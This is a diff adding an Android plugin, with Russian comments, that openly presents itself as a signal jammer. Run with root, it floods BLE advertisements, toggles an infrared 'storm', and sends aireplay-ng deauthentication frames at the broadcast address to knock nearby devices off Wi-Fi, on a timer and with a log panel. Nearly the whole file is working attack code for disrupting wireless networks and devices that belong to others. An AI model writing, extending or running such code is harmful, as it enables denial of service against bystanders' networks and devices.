@@ -1,0 +1,232 @@
+__id__ = "signal_jammer_root_v2"
+__name__ = "Signal Jammer Root v2"
+__version__ = "2.0.0"
+__author__ = "Colin"
+__description__ = "Глушилка BLE/Wi-Fi/ИК с root, настраиваемым временем и логами"
+__icon__ = "rounded:settings_input_antenna"
+__permissions__ = ["ble_spam", "wifi", "ir", "root"]
+
+import json
+import time
+import threading
+from datetime import datetime
+
+class SignalJammerRootV2(BasePlugin):
+    def __init__(self):
+        super().__init__()
+        self.jamming = False
+        self.thread = None
+        self.duration = 10          # секунды по умолчанию
+        self.remaining = 0
+        self.logs = []              # список строк лога
+        self.lock = threading.Lock()
+        self.wifi_iface = "wlan0"
+        self.ble_ok = False
+        self.ir_ok = False
+        self.root_ok = False
+
+    # ---------- Логирование ----------
+    def log(self, msg):
+        ts = datetime.now().strftime("%H:%M:%S")
+        line = f"[{ts}] {msg}"
+        with self.lock:
+            self.logs.append(line)
+            if len(self.logs) > 200:
+                self.logs.pop(0)
+        print(line)
+        try:
+            self.refresh()
+        except:
+            pass
+
+    def get_log_text(self):
+        with self.lock:
+            return "\n".join(self.logs[-60:]) if self.logs else "Логов пока нет."
+
+    # ---------- Загрузка ----------
+    def on_plugin_load(self):
+        self.add_module(
+            title="Signal Jammer Root v2",
+            description="Настраиваемое время помех + логи",
+            icon="settings_input_antenna",
+            screen="main",
+            section="PLUGINS"
+        )
+        # Проверка root
+        try:
+            res = self.root("id")
+            self.root_ok = "uid=0" in str(res)
+            self.log(f"Root: {'OK' if self.root_ok else 'НЕТ'}")
+        except Exception as e:
+            self.root_ok = False
+            self.log(f"Root ошибка: {e}")
+
+        # Проверка BLE
+        try:
+            dev = self.api.getDevice()
+            self.ble_ok = bool(dev.btLeAdvertiserAvailable())
+            self.log(f"BLE advertiser: {'OK' if self.ble_ok else 'НЕТ'}")
+        except Exception as e:
+            self.ble_ok = False
+            self.log(f"BLE ошибка: {e}")
+
+        # Проверка ИК
+        try:
+            self.ir_ok = bool(self.api.getAndroid().irHasEmitter())
+            self.log(f"IR emitter: {'OK' if self.ir_ok else 'НЕТ'}")
+        except Exception as e:
+            self.ir_ok = False
+            self.log(f"IR ошибка: {e}")
+
+    # ---------- UI ----------
+    def screen_main(self, ui, api, state):
+        status = "АКТИВЕН" if self.jamming else "ВЫКЛ"
+        remaining_text = f"Осталось: {self.remaining} сек" if self.jamming else ""
+
+        return ui.scaffold(
+            title="Signal Jammer Root v2",
+            content=ui.lazy_column([
+                ui.card([
+                    ui.text("Настройки помех", "headlineSmall"),
+                    ui.text(
+                        f"Root: {'✅' if self.root_ok else '❌'}  "
+                        f"BLE: {'✅' if self.ble_ok else '❌'}  "
+                        f"IR: {'✅' if self.ir_ok else '❌'}",
+                        "bodySmall"
+                    ),
+                    ui.slider(
+                        value=self.duration,
+                        on_change=self.on_duration_change,
+                        minimum=1,
+                        maximum=120,
+                        title=f"Длительность: {self.duration} сек",
+                        steps=119
+                    ),
+                    ui.switch(
+                        checked=self.jamming,
+                        on_change=self.toggle_jamming,
+                        title="Активно",
+                        subtitle="BLE-флуд + Wi-Fi deauth + ИК-шторм"
+                    ),
+                    ui.button(f"Старт на {self.duration} сек", self.start_burst),
+                    ui.text(status, "titleMedium"),
+                    ui.text(remaining_text, "bodySmall")
+                ]),
+                ui.card([
+                    ui.text("Логи", "titleMedium"),
+                    ui.button("Очистить логи", self.clear_logs),
+                    ui.log_panel(self.get_log_text(), max_height=240)
+                ])
+            ], padding=16, spacing=12)
+        )
+
+    # ---------- Обработчики ----------
+    def on_duration_change(self, value):
+        self.duration = int(value)
+        self.refresh()
+
+    def clear_logs(self):
+        with self.lock:
+            self.logs.clear()
+        self.log("Логи очищены")
+        self.refresh()
+
+    def toggle_jamming(self, checked):
+        if checked:
+            self.start_burst()
+        else:
+            self.stop_jamming()
+
+    def start_burst(self):
+        if self.jamming:
+            self.toast("Уже работает")
+            return
+        self.log(f"Запуск помех на {self.duration} сек")
+        self.jamming = True
+        self.remaining = self.duration
+        self.thread = threading.Thread(target=self._jam_loop)
+        self.thread.daemon = True
+        self.thread.start()
+        self.toast(f"Помехи {self.duration} сек")
+
+    def stop_jamming(self):
+        if not self.jamming:
+            return
+        self.jamming = False
+        self.remaining = 0
+        self.log("Остановка помех...")
+        try:
+            self.api.getAndroid().bleAdvertiseStop()
+            self.log("BLE остановлен")
+        except Exception as e:
+            self.log(f"BLE stop: {e}")
+        try:
+            self.api.getAndroid().irToggleStorm()
+            self.log("IR storm выключен")
+        except Exception as e:
+            self.log(f"IR stop: {e}")
+        try:
+            self.root("pkill aireplay-ng")
+            self.log("aireplay-ng убит")
+        except Exception as e:
+            self.log(f"pkill: {e}")
+        self.toast("Помехи остановлены")
+        self.refresh()
+
+    # ---------- Основной цикл ----------
+    def _jam_loop(self):
+        android = self.api.getAndroid()
+        start = time.time()
+        end = start + self.duration
+
+        while self.jamming and time.time() < end:
+            self.remaining = max(0, int(end - time.time()))
+
+            # BLE flood
+            if self.ble_ok:
+                try:
+                    ok = android.bleAdvertiseStart(
+                        manufacturerId=0xFFFF,
+                        payloadHex="00" * 31,
+                        connectable=False,
+                        includeName=True
+                    )
+                    if ok:
+                        self.log("BLE пакет отправлен")
+                    else:
+                        self.log("BLE пакет не принят")
+                except Exception as e:
+                    self.log(f"BLE ошибка: {e}")
+
+            # IR storm
+            if self.ir_ok:
+                try:
+                    android.irToggleStorm()
+                    self.log("IR storm включён")
+                except Exception as e:
+                    self.log(f"IR ошибка: {e}")
+
+            # Wi-Fi deauth (если root и aireplay-ng)
+            if self.root_ok:
+                try:
+                    res = self.root(f"airmon-ng start {self.wifi_iface}")
+                    self.log(f"airmon: {str(res)[:60]}")
+                    iface_mon = f"{self.wifi_iface}mon"
+                    # Быстрый deauth на все BSSID (упрощённо)
+                    res2 = self.root(f"aireplay-ng --deauth 3 -a FF:FF:FF:FF:FF:FF {iface_mon}")
+                    self.log(f"aireplay: {str(res2)[:60]}")
+                    self.root(f"airmon-ng stop {iface_mon}")
+                except Exception as e:
+                    self.log(f"Wi-Fi ошибка: {e}")
+
+            time.sleep(1)
+
+        # Завершение по таймеру
+        if self.jamming:
+            self.log("Таймер истёк — остановка")
+            self.stop_jamming()
+
+    # ---------- Выгрузка ----------
+    def on_plugin_unload(self):
+        self.log("Плагин выгружается")
+        self.stop_jamming()
